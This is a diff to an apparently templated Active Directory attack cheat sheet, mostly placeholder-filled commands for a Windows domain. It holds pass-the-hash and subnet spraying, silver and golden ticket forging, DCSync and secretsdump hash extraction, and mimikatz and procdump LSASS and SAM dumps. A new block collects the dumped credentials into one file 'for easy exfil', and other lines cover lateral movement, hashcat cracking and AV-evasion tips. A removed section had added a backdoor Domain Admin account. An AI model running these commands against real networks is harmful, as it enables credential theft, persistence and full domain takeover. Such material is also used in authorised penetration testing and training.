@@ -3,8 +3,9 @@
 impacket-psexec {{DOMAIN}}/{{USER}}@{{TARGET}} -hashes :{{NTLM_HASH}}
 impacket-wmiexec {{DOMAIN}}/{{USER}}@{{TARGET}} -hashes :{{NTLM_HASH}}
 impacket-smbexec {{DOMAIN}}/{{USER}}@{{TARGET}} -hashes :{{NTLM_HASH}}
-# CrackMapExec spray across subnet
+# CrackMapExec - domain and local auth variants
 crackmapexec smb {{TARGET}}/24 -u {{USER}} -H {{NTLM_HASH}} --continue-on-success
+crackmapexec smb {{TARGET}}/24 -u {{USER}} -H {{NTLM_HASH}} --local-auth --continue-on-success
 
 # === OVERPASS THE HASH (NTLM → KERBEROS) ===
 # Use NTLM hash to get Kerberos TGT - blends in better than PtH
@@ -18,68 +19,50 @@ net use \\{{TARGET_HOST}}\share
 .\mimikatz.exe "sekurlsa::tickets /export" exit
 # Import a ticket
 .\mimikatz.exe "kerberos::ptt {{TICKET_FILE}}.kirbi" exit
-# Verify tickets loaded
 klist
-# Rubeus alternative
 .\Rubeus.exe dump /nowrap
 .\Rubeus.exe ptt /ticket:{{BASE64_TICKET}}
 
 # === SILVER TICKET ===
-# Forge a TGS for a specific service - no DC contact needed
+# Forge TGS for specific service - no DC contact needed
 # Requires: target SPN, domain SID, service account NTLM hash
 .\mimikatz.exe "kerberos::golden /sid:{{DOMAIN_SID}} /domain:{{DOMAIN}} /ptt /target:{{TARGET_HOST}}.{{DOMAIN}} /service:http /rc4:{{NTLM_HASH}} /user:{{USER}}" exit
 klist
 
 # === DCSYNC (if DA or replication rights) ===
-# Pull any account hash directly from DC - most reliable post-DA technique
-.\mimikatz.exe "lsadump::dcsync /domain:{{DOMAIN}} /user:krbtgt" exit
-.\mimikatz.exe "lsadump::dcsync /domain:{{DOMAIN}} /all /csv" exit
-# Impacket alternative (from Kali)
+# Impacket from Kali (preferred - no AV exposure)
 impacket-secretsdump {{DOMAIN}}/{{USER}}:{{PASS}}@{{DC_IP}} -just-dc-ntlm
 impacket-secretsdump {{DOMAIN}}/{{USER}}@{{DC_IP}} -hashes :{{NTLM_HASH}} -just-dc-ntlm
 
 # === GOLDEN TICKET ===
-# Requires krbtgt hash (from DCSync above) - persistence after DA
-# 1. Get domain SID
-impacket-getPac -targetUser {{USER}} {{DOMAIN}}/{{USER}}:{{PASS}}
-# 2. Generate golden ticket (mimikatz)
+# Requires krbtgt hash from DCSync - persistence after DA
 .\mimikatz.exe "kerberos::golden /user:Administrator /domain:{{DOMAIN}} /sid:{{DOMAIN_SID}} /krbtgt:{{KRBTGT_HASH}} /ptt" exit
-# 3. Verify and use
 klist
 dir \\{{DC_HOSTNAME}}.{{DOMAIN}}\c$
-# Impacket golden ticket alternative
-ticketer.py -nthash {{KRBTGT_HASH}} -domain-sid {{DOMAIN_SID}} -domain {{DOMAIN}} Administrator
-impacket-psexec -target-ip {{DC_IP}} -ticket Administrator.ccache {{DOMAIN}}/Administrator
 
-# === LATERAL MOVEMENT - WINRM / PSEXEC ===
-evil-winrm -I {{TARGET}} -u {{USER}} -p {{PASS}}
-evil-winrm -I {{TARGET}} -u {{USER}} -H {{NTLM_HASH}}
-impacket-psexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET}}
-# RDP (preferred - avoids Kerberos auth issues)
-xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /p:{{PASS}} /v:{{TARGET}} /drive:share,/home/kali/share
-
-# === LSASS CREDENTIAL DUMP ===
-# Task Manager method (requires interactive session)
-# Task Manager → Details → lsass.exe → Create dump file → transfer and parse on Kali
-# Mimikatz in-memory dump
-.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
-# Mimikatz SAM dump
-.\mimikatz.exe "privilege::debug" "lsadump::sam" exit
-# Procdump (less flagged by AV)
+# === CREDENTIAL DUMP - THREE COMMAND FULL EXTRACTION ===
+# Run all three - outputs to single file for easy exfil
+# 1. DCSync all accounts (requires DA or replication rights)
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::dcsync /domain:{{DOMAIN}} /all /csv" "exit" > C:\temp\creds_{{TARGET}}.txt
+# 2. LSASS logon passwords (currently logged-in users, plaintext if WDigest enabled)
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit" >> C:\temp\creds_{{TARGET}}.txt
+# 3. SAM + LSA secrets + cached domain creds
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "exit" >> C:\temp\creds_{{TARGET}}.txt
+# Procdump alternative (less AV exposure) - parse on Kali
 .\procdump.exe -ma lsass.exe lsass.dmp
-# Parse dump on Kali
 .\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
 
+# === LATERAL MOVEMENT ===
+evil-winrm -i {{TARGET}} -u {{USER}} -p {{PASS}}
+evil-winrm -i {{TARGET}} -u {{USER}} -H {{NTLM_HASH}}
+impacket-psexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET}}
+# RDP with Kali share mapped (preferred - avoids Kerberos auth issues)
+xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /p:{{PASS}} /v:{{TARGET}} /drive:share,/home/kali/tmp
+
 # === POST-ROOT DOMAIN ENUMERATION ===
-# Dump all domain hashes (NTDS.dit equivalent via DCSync)
+# All domain hashes for cracking
 impacket-secretsdump {{DOMAIN}}/Administrator@{{DC_IP}} -just-dc-ntlm -outputfile domain_hashes.txt
-# All user hashes for offline cracking
 hashcat -m 1000 domain_hashes.txt /usr/share/wordlists/rockyou.txt
-# Find all DA accounts
 net group "Domain Admins" /domain
 net group "Enterprise Admins" /domain
-# Enumerate trust relationships
 Get-NetDomainTrust
-# Add persistence - new DA account
-net user backdoor P@ssw0rd! /add /domain
-net group "Domain Admins" backdoor /add /domain
